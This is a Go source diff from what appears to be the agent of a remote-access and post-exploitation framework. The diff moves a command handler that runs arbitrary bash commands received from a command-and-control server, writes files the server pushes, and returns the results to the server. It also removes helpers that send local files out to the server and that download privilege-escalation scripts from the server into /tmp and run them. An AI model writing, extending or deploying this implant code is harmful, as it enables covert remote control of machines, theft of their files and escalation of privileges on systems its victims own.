@@ -18,9 +18,118 @@ import (
 	"strings"
 	"time"
 
-	gops "github.com/mitchellh/go-ps"
 	"github.com/zcalusic/sysinfo"
 )
+
+// exec cmd, receive data, etc
+func processCCData(data *TunData) {
+	var (
+		data2send   TunData
+		out         string
+		outCombined []byte
+		err         error
+	)
+	data2send.Tag = Tag
+
+	payloadSplit := strings.Split(data.Payload, OpSep)
+	op := payloadSplit[0]
+
+	switch op {
+
+	// command from CC
+	case "cmd":
+		cmdSlice := strings.Fields(payloadSplit[1])
+
+		// # shell helpers
+		if strings.HasPrefix(cmdSlice[0], "#") {
+			out = shellHelper(cmdSlice)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
+		// change directory
+		if cmdSlice[0] == "cd" {
+			if len(cmdSlice) != 2 {
+				return
+			}
+
+			if os.Chdir(cmdSlice[1]) == nil {
+				out = "changed directory to " + cmdSlice[1]
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+				goto send
+			}
+		}
+
+		// current working directory
+		if cmdSlice[0] == "pwd" {
+			if len(cmdSlice) != 1 {
+				return
+			}
+
+			pwd, err := os.Getwd()
+			if err != nil {
+				log.Println("processCCData: cant get pwd: ", err)
+				pwd = err.Error()
+			}
+
+			out = "current working directory: " + pwd
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
+		// LPE helper
+		if strings.HasPrefix(cmdSlice[0], "lpe_") {
+			out = lpeHelper(cmdSlice[0])
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
+		// exec cmd using os/exec normally, sends stdout and stderr back to CC
+		cmd := exec.Command("bash", "-c", strings.Join(cmdSlice, " "))
+		outCombined, err = cmd.CombinedOutput()
+		if err != nil {
+			log.Println(err)
+			outCombined = []byte(fmt.Sprintf("%s\n%v", outCombined, err))
+		}
+
+		out = string(outCombined)
+		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+
+	// #put file from CC
+	case "FILE":
+		if len(payloadSplit) != 3 {
+			data2send.Payload = fmt.Sprintf("#put failed: malformed #put command")
+			goto send
+		}
+
+		// where to save the file
+		path := payloadSplit[1]
+		data := payloadSplit[2]
+
+		// decode
+		decData, err := base64.StdEncoding.DecodeString(data)
+		if err != nil {
+			data2send.Payload = fmt.Sprintf("#put %s failed: %v", path, err)
+			goto send
+		}
+
+		// write file
+		err = ioutil.WriteFile(path, decData, 0600)
+		if err != nil {
+			data2send.Payload = fmt.Sprintf("#put %s failed: %v", path, err)
+			goto send
+		}
+		log.Printf("Saved %s from CC", path)
+		data2send.Payload = fmt.Sprintf("#put %s successfully done", path)
+
+	default:
+	}
+
+send:
+	if err = Send2CC(&data2send); err != nil {
+		log.Println(err)
+	}
+}
 
 // Send2CC send TunData to CC
 func Send2CC(data *TunData) error {
@@ -156,185 +265,6 @@ func collectLocalIPs() (ips []string) {
 	}
 
 	return
-}
-
-// exec cmd, receive data, etc
-func processCCData(data *TunData) {
-	var (
-		data2send   TunData
-		out         string
-		outCombined []byte
-		err         error
-	)
-	data2send.Tag = Tag
-
-	payloadSplit := strings.Split(data.Payload, OpSep)
-	op := payloadSplit[0]
-
-	switch op {
-
-	// command from CC
-	case "cmd":
-		cmdSlice := strings.Fields(payloadSplit[1])
-
-		// # shell helpers
-		if strings.HasPrefix(cmdSlice[0], "#") {
-			out = shellHelper(cmdSlice)
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
-			goto send
-		}
-
-		// change directory
-		if cmdSlice[0] == "cd" {
-			if len(cmdSlice) != 2 {
-				return
-			}
-
-			if os.Chdir(cmdSlice[1]) == nil {
-				out = "changed directory to " + cmdSlice[1]
-				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
-				goto send
-			}
-		}
-
-		// current working directory
-		if cmdSlice[0] == "pwd" {
-			if len(cmdSlice) != 1 {
-				return
-			}
-
-			pwd, err := os.Getwd()
-			if err != nil {
-				log.Println("processCCData: cant get pwd: ", err)
-				pwd = err.Error()
-			}
-
-			out = "current working directory: " + pwd
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
-			goto send
-		}
-
-		// LPE helper
-		if strings.HasPrefix(cmdSlice[0], "lpe_") {
-			out = lpeHelper(cmdSlice[0])
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
-			goto send
-		}
-
-		// exec cmd using os/exec normally, sends stdout and stderr back to CC
-		cmd := exec.Command("bash", "-c", strings.Join(cmdSlice, " "))
-		outCombined, err = cmd.CombinedOutput()
-		if err != nil {
-			log.Println(err)
-			outCombined = []byte(fmt.Sprintf("%s\n%v", outCombined, err))
-		}
-
-		out = string(outCombined)
-		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
-
-	// #put file from CC
-	case "FILE":
-		if len(payloadSplit) != 3 {
-			data2send.Payload = fmt.Sprintf("#put failed: malformed #put command")
-			goto send
-		}
-
-		// where to save the file
-		path := payloadSplit[1]
-		data := payloadSplit[2]
-
-		// decode
-		decData, err := base64.StdEncoding.DecodeString(data)
-		if err != nil {
-			data2send.Payload = fmt.Sprintf("#put %s failed: %v", path, err)
-			goto send
-		}
-
-		// write file
-		err = ioutil.WriteFile(path, decData, 0600)
-		if err != nil {
-			data2send.Payload = fmt.Sprintf("#put %s failed: %v", path, err)
-			goto send
-		}
-		log.Printf("Saved %s from CC", path)
-		data2send.Payload = fmt.Sprintf("#put %s successfully done", path)
-
-	default:
-	}
-
-send:
-	if err = Send2CC(&data2send); err != nil {
-		log.Println(err)
-	}
-}
-
-// shellHelper ps and kill and other helpers
-func shellHelper(cmdSlice []string) (out string) {
-	cmd := cmdSlice[0]
-	args := cmdSlice[1:]
-
-	switch cmd {
-	case "#ps":
-		procs, err := gops.Processes()
-		if err != nil {
-			out = fmt.Sprintf("failed to ps: %v", err)
-		}
-
-		for _, proc := range procs {
-			out = fmt.Sprintf("%s\n%d<-%d    %s", out, proc.Pid(), proc.PPid(), proc.Executable())
-		}
-	case "#kill":
-		for _, pidStr := range args {
-			pid, err := strconv.Atoi(pidStr)
-			if err != nil {
-				continue
-			}
-			proc, err := os.FindProcess(pid)
-			if err != nil {
-				continue
-			}
-
-			// kill process
-			err = proc.Kill()
-			if err != nil {
-				out = fmt.Sprintf("%s\nfailed to kill %d: %v", out, pid, err)
-				continue
-			}
-			out = fmt.Sprintf("%s\nsuccessfully killed %d", out, pid)
-		}
-	case "#get":
-		filepath := args[0]
-		checksum, err := file2CC(filepath)
-		out = fmt.Sprintf("%s (%s) has been sent, please check", filepath, checksum)
-		if err != nil {
-			out = filepath + err.Error()
-		}
-	default:
-		out = "Unknown helper"
-	}
-
-	return
-}
-
-// lpeHelper runs les and upc to suggest LPE methods
-func lpeHelper(method string) string {
-	err := Download(CCAddress+method, "/tmp/"+method)
-	if err != nil {
-		return "LPE error: " + err.Error()
-	}
-	lpe := fmt.Sprintf("/tmp/%s", method)
-
-	cmd := exec.Command("/bin/bash", lpe)
-	if method == "lpe_upc" {
-		cmd = exec.Command("/bin/bash", lpe, "standard")
-	}
-
-	outBytes, err := cmd.CombinedOutput()
-	if err != nil {
-		return "LPE error: " + string(outBytes)
-	}
-
-	return string(outBytes)
 }
 
 // send local file to CC
